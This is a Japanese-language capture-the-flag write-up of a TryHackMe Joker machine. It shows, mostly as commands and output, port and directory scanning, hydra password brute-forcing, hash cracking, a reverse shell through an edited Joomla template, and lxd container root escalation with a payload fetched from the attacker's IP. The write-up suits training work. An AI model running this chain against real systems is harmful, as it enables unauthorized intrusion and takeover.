# HA Jocker CTF

<URL>

## Enumeration

```shell
TARGET=10.201.6.78
sudo bash -c "echo $TARGET   joker.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -sS -p- $TARGET

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
```

```sh
sudo nmap -sS -sV -p22,80,8080 $TARGET

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
8080/tcp open  http    Apache httpd 2.4.29
```

SSH, HTTP*2。8080はBasic認証。

### ディレクトリ列挙

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

root@ip-10-201-59-53:~# gobuster dir -q -x=txt,php -u http://$TARGET -w ./dirlist.txt -t 64 -k
/css                  (Status: 301) [Size: 308] [--> http://10.201.6.78/css/]
/img                  (Status: 301) [Size: 308] [--> http://10.201.6.78/img/]
/phpinfo.php          (Status: 200) [Size: 94753]
/secret.txt           (Status: 200) [Size: 320]
```

秘密ファイル、phpinfoを発見。

```txt
Batman hits Joker.
Joker: "Bats you may be a rock but you won't break me." (Laughs!)
Batman: "I will break you with this rock. You made a mistake now."
Joker: "This is one of your 100 poor jokes, when will you get a sense of humor bats! You are dumb as a rock."
Joker: "HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA!"
```

### 8080 Basic認証

ブルートフォースでjokerユーザーのパスワード判明。

```sh
root@ip-10-201-59-53:~# hydra -l joker -P /usr/share/wordlists/rockyou.txt joker.thm -m / http-get -s 8080 -t 30
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-26 02:38:46
[DATA] max 30 tasks per 1 server, overall 30 tasks, 14344398 login tries (l:1/p:14344398), ~478147 tries per task
[DATA] attacking http-get://joker.thm:8080/
[8080][http-get] host: joker.thm   login: joker   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-26 02:39:24
```

トップページを表示すると、管理者画面のパスが書かれていた。

問題文から、バックアップファイルが含まれていることが分かるので探す。

```sh
root@ip-10-201-59-53:~# gobuster dir -q -x=txt,bak -u http://joker.thm:8080/ -w ./dirlist.txt -t 64 -k -U joker -P [REDACTED]

/administrator        (Status: 301) [Size: 321] [--> http://joker.thm:8080/administrator/]
/backup               (Status: 200) [Size: 12133560]
/bin                  (Status: 301) [Size: 311] [--> http://joker.thm:8080/bin/]
/cache                (Status: 301) [Size: 313] [--> http://joker.thm:8080/cache/]
/cli                  (Status: 301) [Size: 311] [--> http://joker.thm:8080/cli/]
/components           (Status: 301) [Size: 318] [--> http://joker.thm:8080/components/]
/htaccess             (Status: 200) [Size: 3005]
/htaccess.txt         (Status: 200) [Size: 3005]
/images               (Status: 301) [Size: 314] [--> http://joker.thm:8080/images/]
/includes             (Status: 301) [Size: 316] [--> http://joker.thm:8080/includes/]
/language             (Status: 301) [Size: 316] [--> http://joker.thm:8080/language/]
/layouts              (Status: 301) [Size: 315] [--> http://joker.thm:8080/layouts/]
/libraries            (Status: 301) [Size: 317] [--> http://joker.thm:8080/libraries/]
/LICENSE              (Status: 200) [Size: 18092]
/LICENSE.txt          (Status: 200) [Size: 18092]
/media                (Status: 301) [Size: 313] [--> http://joker.thm:8080/media/]
/modules              (Status: 301) [Size: 315] [--> http://joker.thm:8080/modules/]
/plugins              (Status: 301) [Size: 315] [--> http://joker.thm:8080/plugins/]
/README               (Status: 200) [Size: 4494]
/README.txt           (Status: 200) [Size: 4494]
/robots               (Status: 200) [Size: 836]
/robots.txt           (Status: 200) [Size: 836]
/robots.txt           (Status: 200) [Size: 836]
/templates            (Status: 301) [Size: 317] [--> http://joker.thm:8080/templates/]
/tmp                  (Status: 301) [Size: 311]
```

/backup にアクセスすると、zipファイルがダウンロードされる。  
zip2john でzipのパスワードをクラック。

db, site ディレクトリが含まれていた。

```sh
$ ls -al       
total 11872
drwxrwxr-x  4 kali kali     4096 Oct 26 11:52 .
drwxrwxr-x  6 kali kali     4096 Oct 26 11:26 ..
-rw-rw-r--  1 kali kali 12133560 Oct 26 11:47 backup.zip
drwxr-xr-x  2 kali kali     4096 Oct 26 11:52 db
-rw-rw-r--  1 kali kali     1000 Oct 26 11:50 hash.txt
drwxr-xr-x 17 kali kali     4096 Oct 26  2019 site
```

```sh
$ ls -al ./db  
total 260
drwxr-xr-x 2 kali kali   4096 Oct 26 11:52 .
drwxrwxr-x 4 kali kali   4096 Oct 26 11:52 ..
-rw-r--r-- 1 kali kali 257091 Oct 26  2019 joomladb.sql
```

```sh
$ ls -al ./site
total 116
drwxr-xr-x 17 kali kali  4096 Oct 26  2019 .
drwxrwxr-x  4 kali kali  4096 Oct 26 11:52 ..
drwxr-xr-x 11 kali kali  4096 Oct 26  2019 administrator
drwxr-xr-x  2 kali kali  4096 Oct 26  2019 bin
drwxr-xr-x  2 kali kali  4096 Oct 26  2019 cache
drwxr-xr-x  2 kali kali  4096 Oct 26  2019 cli
drwxr-xr-x 19 kali kali  4096 Oct 26  2019 components
-rw-r--r--  1 kali kali  1904 Oct 26  2019 configuration.php
-rwxr-xr-x  1 kali kali  3005 Oct 26  2019 htaccess.txt
drwxr-xr-x  5 kali kali  4096 Oct 26  2019 images
drwxr-xr-x  2 kali kali  4096 Oct 26  2019 includes
-rwxr-xr-x  1 kali kali  1420 Oct 26  2019 index.php
drwxr-xr-x  4 kali kali  4096 Oct 26  2019 language
drwxr-xr-x  5 kali kali  4096 Oct 26  2019 layouts
drwxr-xr-x 11 kali kali  4096 Oct 26  2019 libraries
-rwxr-xr-x  1 kali kali 18092 Oct 26  2019 LICENSE.txt
drwxr-xr-x 26 kali kali  4096 Oct 26  2019 media
drwxr-xr-x 27 kali kali  4096 Oct 26  2019 modules
drwxr-xr-x 16 kali kali  4096 Oct 26  2019 plugins
-rwxr-xr-x  1 kali kali  4494 Oct 26  2019 README.txt
-rwxr-xr-x  1 kali kali   836 Oct 26  2019 robots.txt
drwxr-xr-x  5 kali kali  4096 Oct 26  2019 templates
drwxr-xr-x  2 kali kali  4096 Oct 26  2019 tmp
-rwxr-xr-x  1 kali kali  1690 Oct 26  2019 web.config.txt
```

sqlファイルを解析。  
cc1gr_usersテーブルのINSERTに管理者ユーザーのパスワードハッシュが出ていた。  
hashcatでパスワードをクラックできた。

error.php のテンプレートを書き換え、http://joker.thm:8080/templates/beez3/error.php にアクセスしてトリガー。

```sh
$ nc -lnvp 8888
listening on [any] 8888 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.6.78] 54342
Linux ubuntu 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 20:07:55 up 42 min,  0 users,  load average: 0.00, 0.60, 3.27
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
```

## 権限昇格

lxdグループを使う。

kaliでエクスプロイト用イメージをダウンロード。

```sh
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine

python -m http.server
```

targetでエクスプロイト。

```sh
cd /tmp
wget http://10.11.146.32:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz

www-data@ubuntu:/tmp$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b
www-data@ubuntu:/tmp$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| myimage | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Oct 26, 2025 at 3:15am (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
www-data@ubuntu:/tmp$ lxc init myimage ignite -c security.privileged=true
Creating ignite
www-data@ubuntu:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
www-data@ubuntu:/tmp$ lxc start ignite
www-data@ubuntu:/tmp$ lxc exec ignite /bin/sh
~ # id
uid=0(root) gid=0(root)
~ # cd /mnt/root/root
/mnt/root/root # ls -al
total 40
drwx------    5 root     root          4096 Oct 25  2019 .
drwxr-xr-x   22 root     root          4096 Oct 22  2019 ..
-rw-------    1 root     root            40 Oct 25  2019 .bash_history
-rw-r--r--    1 root     root          3106 Apr  9  2018 .bashrc
drwx------    2 root     root          4096 Oct 22  2019 .cache
drwxr-x---    3 root     root          4096 Oct 24  2019 .config
drwxr-xr-x    3 root     root          4096 Oct  8  2019 .local
-rw-------    1 root     root            33 Oct 24  2019 .mysql_history
-rw-r--r--    1 root     root           148 Aug 17  2015 .profile
-rw-r--r--    1 root     root          1003 Oct  8  2019 [REDACTED]
```

## 振り返り

- ガイド付きだったこともあり、lxd 権限昇格のやり方さえ知っていればかなり簡単なチャレンジ。
- lxc を久しぶりに触って良い練習にはなった。
